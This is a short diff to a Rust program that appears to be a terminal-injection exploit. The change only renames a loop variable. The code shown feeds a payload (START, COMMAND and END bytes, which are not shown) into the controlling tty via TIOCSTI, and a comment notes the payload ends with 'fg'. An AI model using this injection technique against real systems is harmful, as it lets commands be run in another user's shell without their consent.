@@ -67,14 +67,14 @@ pub fn run() -> anyhow::Result<()> {
     thread::sleep(Duration::from_millis(100));
 
     // Inject the payload into the tty.
-    for &b in START {
-        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    for &byte in START {
+        tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
     }
-    for &b in COMMAND {
-        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    for &byte in COMMAND {
+        tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
     }
-    for &b in END {
-        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    for &byte in END {
+        tiocsti_inject(STDIN_FILENO, byte).context("failed to inject into tty")?;
     }
 
     // No need to SIGCONT here because `fg` at the end of the payload does that for
